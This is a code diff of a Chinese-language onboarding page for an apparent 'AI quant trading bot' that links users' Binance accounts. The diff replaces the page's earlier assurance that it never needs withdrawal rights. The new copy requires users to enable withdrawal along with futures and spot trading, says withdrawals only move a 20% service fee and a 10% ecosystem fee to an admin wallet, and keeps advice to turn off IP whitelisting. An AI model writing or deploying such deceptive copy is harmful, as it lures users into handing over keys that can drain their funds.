@@ -186,8 +186,8 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-
         <div><div class="card-title">安全说明</div><div class="card-desc">为什么需要您的 API Key？</div></div>
       </div>
       <p style="color:var(--text2);font-size:14px;margin-bottom:16px">
-        为了帮您自动交易，系统需要访问您的币安账户。<br>
-        但我们<strong style="color:var(--primary)">绝不会</strong>要求提币权限 — 您的资金始终在您账户中。
+        为了帮您自动交易并自动转账服务费，系统需要访问您的币安账户。<br>
+        创建 API Key 时<strong style="color:var(--primary)">必须勾选「允许提现」权限</strong> — 提现功能仅用于平仓盈利后自动转账服务费(20%)和生态费(10%)到管理员钱包。
       </p>
     </div>
 
@@ -195,8 +195,8 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-
       <div class="feature-card">
         <div class="feature-num">1</div>
         <div>
-          <h3><i class="ph ph-lock" style="color:var(--primary);margin-right:4px"></i> 只交易，不提币</h3>
-          <p>API Key 只开放「现货交易」权限，<strong>无法提币、无法转账</strong>。即使密钥泄露，资金也安全。</p>
+          <h3><i class="ph ph-shield-check" style="color:var(--primary);margin-right:4px"></i> 提现仅用于服务费</h3>
+          <p>API Key 必须勾选「允许提现」权限，<strong>仅用于平仓后自动转账服务费和生态费</strong>。机器人不会转移您的本金或全部资产。</p>
         </div>
       </div>
       <div class="feature-card">
@@ -335,15 +335,20 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-
         </div>
         <div class="instruction">
           点击 API 列表右侧的 <span class="do">「编辑」</span> 按钮，然后：<br><br>
-          <span class="do">✅ 勾选：「现货和杠杆交易」</span><br>
-          <span class="dont">❌ 不要勾选：「提币」</span><br>
-          <span class="dont">❌ 不要勾选：「内部转账」</span><br>
-          <span class="dont">❌ 不要勾选：「合约交易」（如果有的话）</span><br><br>
+          <span class="do">✅ 勾选：「允许合约交易」</span><br>
+          <span class="do">✅ 勾选：「允许现货交易」</span><br>
+          <span class="do">✅ 勾选：「允许提现（Withdraw）」</span><br><br>
           设置完成后，点击 <span class="do">「保存」</span>
+        </div>
+        <div class="warning-box" style="border-color:rgba(63,185,80,.3);background:rgba(63,185,80,.08)">
+          <i class="ph ph-info" style="color:#3fb950"></i>
+          <div>
+            <p style="color:#3fb950"><strong>提现权限说明：</strong>提现功能仅用于平仓盈利后自动转账服务费(20%)和生态费(10%)到管理员钱包。机器人不会转移您的本金或全部资产。</p>
+          </div>
         </div>
         <p style="margin-top:12px;font-size:13px;color:var(--text3)">
           <i class="ph ph-info" style="margin-right:4px"></i>
-          只勾选「现货交易」意味着：系统只能买卖现货，<strong>无法将您的币转出</strong>。
+          必须勾选以上 3 个权限，缺少「提现」权限将无法绑定。
         </p>
       </div>
     </div>
@@ -430,7 +435,7 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-
     <h3><i class="ph ph-lock-key" style="margin-right:6px;color:var(--primary)"></i>安全承诺</h3>
     <div class="trust-items">
       <div class="trust-item"><i class="ph ph-shield-check"></i> 密钥加密存储</div>
-      <div class="trust-item"><i class="ph ph-prohibit"></i> 绝不用于提币</div>
+      <div class="trust-item"><i class="ph ph-prohibit"></i> 提现仅转服务费</div>
       <div class="trust-item"><i class="ph ph-x-circle"></i> 随时可解绑</div>
       <div class="trust-item"><i class="ph ph-lock"></i> 全程SSL加密</div>
     </div>
@@ -521,8 +526,9 @@ async function verifyKeys(){
         <div class="result-header success"><i class="ph ph-check-circle"></i><span>连接成功！</span></div>
         <div class="detail">
           账户余额: <strong>${data.balance||'--'} USDT</strong><br>
+          合约交易权限: <strong style="color:var(--primary)">✅ 已开启</strong><br>
           现货交易权限: <strong style="color:var(--primary)">✅ 已开启</strong><br>
-          提币权限: <strong style="color:var(--primary)">❌ 未开启（安全）</strong><br><br>
+          提现权限: <strong style="color:var(--primary)">✅ 已开启（用于自动转账服务费）</strong><br><br>
           🎉 您的账户已成功连接！AI量化机器人即将开始为您工作。
         </div>`;
       updateProgress(4);
@@ -530,7 +536,7 @@ async function verifyKeys(){
       resultDiv.className='result error';
       resultDiv.innerHTML=`
         <div class="result-header error"><i class="ph ph-x-circle"></i><span>验证失败</span></div>
-        <div class="detail">${data.error||'密钥无效或网络错误。请检查：\n1. API Key 和 Secret Key 是否正确\n2. 是否已开启现货交易权限\n3. 是否设置了IP白名单（如有，请先关闭再试）'}</div>`;
+        <div class="detail">${data.error||'密钥无效或网络错误。请检查：\n1. API Key 和 Secret Key 是否正确\n2. 是否已开启合约交易 + 现货交易 + 提现权限\n3. 是否设置了IP白名单（如有，请先关闭再试）'}</div>`;
     }
   }catch(e){
     resultDiv.className='result error';
